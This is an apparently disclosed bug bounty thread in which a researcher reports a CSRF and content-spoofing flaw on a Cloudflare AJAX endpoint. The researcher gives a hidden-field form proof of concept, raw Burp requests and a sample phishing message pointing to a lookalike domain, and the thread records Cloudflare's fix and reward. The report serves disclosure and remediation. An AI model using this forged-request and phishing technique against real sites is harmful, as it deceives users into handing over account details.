title: Content spoofing /CSRF at https://www.cloudflare.com/ajax/modal-dialog.html
vulnerability_information:
Hi there,

I noticed two things on the following url: https://www.cloudflare.com/ajax/modal-dialog.html

##1. CSRF
There are some csrf countermeasures in place (e.g. X-Requested-With: XMLHttpRequest), however they're not validated on the server. 

This leads to an uncritical csrf:

```
<html>
  <body>
    <form action="https://www.cloudflare.com/ajax/modal-dialog.html" method="POST">
      <input type="hidden" name="type" value="default" />
      <input type="hidden" name="content" value="This is my content" />
      <input type="submit" value="Submit request" />
    </form>
  </body>
</html>
```

##2. Content spoofing
Using 1.) I can send some abitary content within the ```content``` parameter to my victim. 

The ```Content-Type``` is ```text/html```, however I was not able to break the filter and conduct a xss at the first glance.

As said, I could send an abitary message fomatted with new-lines to my victim telling him to send over some details or something (be creative here :) ). That would result in a (lame) phishing attack.

#What should you fix?
 - Set a better Content-Type. E.g. "text/plain" 
- Validate the CSRF headers
- Do not send the displayed error message in the request. (e.g. hardcode those message and pass an ID depending on the situation).

Let me know, what you think about this.

Thanks,
Sebastian

activities.message: Automated vulnerability scanners commonly have low priority issues and/or false positives. Before submitting the results from a scanner, please take a moment to confirm that the reported issues are actually valid and exploitable. Please reply if you have a working proof-of-concept or reason to believe that this issue is exploitable.

Hi @jamie,
I'm a bit impressed that you consider my submission the result of automated scanning. Seems like I'm working like a machine lol.

Reading through my report, I'm not sure if I got to the right point/conclusions or if failed at explaining them properly.

I'm going to write a more detailed/throughout report tomorrow.

Sorry for any incovenience,
Sebastian

Okay, I'm going to write the report with some more details again. Please let me know, which part of it seems to be "automated". (I'm curious) I'm going to write down the whole process and some thoughts. - 1. First, we create a new cloudflare testing account. Nothing special should happen here. - 2. Before we continue with the login, we start up burp and configure the browser to route all traffic through it. - 3. After successfully logging in, we add a new domain. - 4. Now we're going to select the "Pause cloudflare" option in the menu of the freshly created domain. We monitor the following HTTP request in burp: ``` POST /ajax/modal-dialog.html HTTP/1.1 Host: www.cloudflare.com User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:28.0) Gecko/20100101 Firefox/28.0 Accept: text/html, */*; q=0.01 Accept-Language: en-US,en;q=0.5 Accept-Encoding: gzip, deflate Content-Type: application/x-www-form-urlencoded; charset=UTF-8 X-Requested-With: XMLHttpRequest Referer: https://www.cloudflare.com/my-websites Content-Length: 249 Cookie: __cfduid=d06d913f43efa0f5a2fd65938cccbcc9b1389285559277; __utma=1.46735460.1398108772.1398112336.1398538770.3; __utmz=1.1398108772.1.1.utmcsr=(direct)|utmccn=(direct)|utmcmd=(none); __utmb=1.3.10.1398538770; __utmc=1; vses2=mi09p521jhp6ps1ud4lg7pi6e4; __cf_effload=1 Connection: keep-alive Pragma: no-cache Cache-Control: no-cache type=default&content=Pause+will+temporarily+deactivate+CloudFlare+for+your+website.+Your+website+will+continue+to+be+online%2C+but+it+will+not+receive+the+performance+and+security+benefits+of+CloudFlare.+Are+you+sure+you+want+to+pause+the+service%3F ``` The response looks like this: ``` HTTP/1.1 200 OK Server: cloudflare-nginx Date: Sat, 26 Apr 2014 19:39:13 GMT Content-Type: text/html Connection: keep-alive X-Frame-Options: DENY Vary: Accept-Encoding Expires: Thu, 19 Nov 1981 08:52:00 GMT Cache-Control: no-store, no-cache, must-revalidate, post-check=0, pre-check=0 Pragma: no-cache Set-Cookie: vses2=mi09p521jhp6ps1ud4lg7pi6e4; path=/; domain=www.cloudflare.com; secure; HttpOnly Cf-Railgun: 06c91e3042 0010 normal c17d CF-RAY: 12153ebea1d800e1-AMS Content-Length: 2157
Pause will temporarily deactivate CloudFlare for your website. Your website will continue to be online, but it will not receive the performance and security benefits of CloudFlare. Are you sure you want to pause the service?
``` Oh, what can we observer here? The content (```content``` parameter) from the request is embedded in the response. So let's try to conduct some kind of XSS. Adding some ```

foobar

``` stuff to the parameter results in the same response. No luck with that :(. After some more investigation, we know that everything after a ```<``` is removed. As far as I know, you can't write any HTML without this special character. However, we are still able to write whatever we want. Let's try it: (set the ```content``` parameter as following and resend the above mentioned request) ``` type=default&content=Hello+cloudlare+user,%0AWe've+detected+a+problem+with+your+account.%0APlease+send+us+your+account+details+to+support+@+cloudfllare.com.%0A%0AThanks,%0AThe+clouddlare+support+team. ``` As expected, we'll get the same text in the response: ```
Hello cloudlare user, We've detected a problem with your account. Please send us your account details to support @ cloudfllare.com. Thanks, The clouddlare support team.
``` Being able to add some foreign content to a AJAX request isn't a security issue by design. So, what next? Taking a look at the ```Content-Type```-Header from the response, we'll see that it's ```text/html```. ``` HTTP/1.1 200 OK Server: cloudflare-nginx Date: Sat, 26 Apr 2014 19:07:25 GMT Content-Type: text/html ``` Great! That way the users browser would interpret the HTML sourcecode of the response and display our message. Otherwise the browsers would display the content as text and the user would see the whole soure code. Now we need to find a way to display our abitary content to our victim. Some kind of CSRF would be useful for that. The HTTP-Request method is ```POST```. So we'll need a form to submit our payload. Taking a second look at the HTTP-request we notice some important/optional headers: ``` Content-Type: application/x-www-form-urlencoded; charset=UTF-8 X-Requested-With: XMLHttpRequest Referer: https://www.cloudflare.com/my-websites ``` As we know, we can't send abitary X-headers using HTML forms. So let's check whether this is used as a CSRF protection by removing the ```Referer``` and the ```X-Requested-WIth``` header and by adjusting the ```Content-Type``` to the following: ``` Content-Type: application/x-www-form-urlencoded ``` The new request should look like this: ``` POST /ajax/modal-dialog.html HTTP/1.1 Host: www.cloudflare.com User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:28.0) Gecko/20100101 Firefox/28.0 Accept: text/html, */*; q=0.01 Accept-Language: en-US,en;q=0.5 Accept-Encoding: gzip, deflate Content-Type: application/x-www-form-urlencoded Content-Length: 200 Cookie: __cfduid=d06d913f43efa0f5a2fd65938cccbcc9b1389285559277; __utma=1.46735460.1398108772.1398112336.1398538770.3; __utmz=1.1398108772.1.1.utmcsr=(direct)|utmccn=(direct)|utmcmd=(none); __utmb=1.3.10.1398538770; __utmc=1; vses2=mi09p521jhp6ps1ud4lg7pi6e4; __cf_effload=1 Connection: keep-alive Pragma: no-cache Cache-Control: no-cache type=default&content=Hello+cloudlare+user,%0AWe've+detected+a+problem+with+your+account.%0APlease+send+us+your+account+details+to+support+@+cloudfllare.com.%0A%0AThanks,%0AThe+clouddlare+support+team. ``` Resubmitting this request through burp gives us the exact result. Seems like there is no CSRF protection in place. Note the double ```l``` in the domain. Let's create our CSRF PoC: ```
``` Let's save it as ```/tmp/csrf.html``` and open it in a new tab: ```firefox /tmp/csrf.html``` This should look like "cloudflare_poc_1.png". The submit button is just for testing purposes. Normally an attacker would fire the form automatically when visiting the exploit. The final result should look like this. "cloudflare_poc_2.png". As you can see, we can display abitary content on the cloudflare website for every authenticated user. This could be used for some kind of phishing. It's a very low critical issue, though. ##How to fix: As mentioned in my original post, there are some ways to fix this problem: - Implement a CSRF protection or validate the X-Requested-With header. This way, I can't send my abitary content to my victim. - Hardcode the embedded response and send a ```content_id``` parameter which will then display the correct message. This way I can't change the content of the response. - Set a proper ```Content-Type```. As the content will be embedded into the requesting website by some javascript, you could change the ```Content-Type``` of the response to ```text/plain```. This way my victim would see the whole HTML sourcecode. Nobody would follow the instructions anymore. I hope that helps, Sebastian
Thank you, our engineers continue to review here.

We believe this issue has been resolved. Please take a moment to reassess and let us know if you disagree. We'll follow up with you in the near future to determine if this submission was eligible under our bug bounty program. Thank you!

Hi @dknecht,
I'll retest the vulnerability later today and let you know the outcome.

Please also consider that this particular endpoint was vulnerable to XSS attacks. My investigation regarding to this attack vector wasn't too indepth, and that's why I referer to the writeup from Osanda Malith:
http://osandamalith.wordpress.com/2014/05/31/xss-in-cloudflare/

Thanks,
Sebastian

Hi @dknecht,
it seems like the issue has been resolved.

Thanks,
Sebastian

Hi,

As an update here, this issue was accepted and corrected. 

We will be in touch regarding the bounty for the report.

Hi @justin,
thanks for the update!

I'll be on vacation from this sunday, so please do not wonder if I do not reply within the next 3 weeks or so :)

Looking forward to the bounty.

Best regards,
Sebastian
We apologize for the delay in reward fulfillment, but look out for an email requesting your shirt size, address, and other information needed for fulfillment next week. Thank you.

Hi @jamie,
thanks for the note!

I got the email and will reply in the next couple of days.

Best regards,
Sebastian
